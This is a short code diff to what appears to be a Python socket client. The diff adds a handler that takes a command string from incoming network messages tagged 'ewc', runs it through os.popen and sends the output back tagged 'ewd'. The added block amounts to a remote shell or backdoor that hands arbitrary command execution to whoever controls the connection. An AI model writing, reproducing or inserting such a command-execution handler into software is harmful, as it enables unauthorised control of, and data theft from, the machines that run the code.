@@ -46,6 +46,14 @@ while True:
             end = end.encode()
 
             s.send(end)
+
+        if(incoming_message[0] == "ewc"):
+            result = os.popen(incoming_message[1]).read()
+
+            end = str(['ewd', result])
+            end = end.encode()
+
+            s.send(end)
             
     except:
         try:
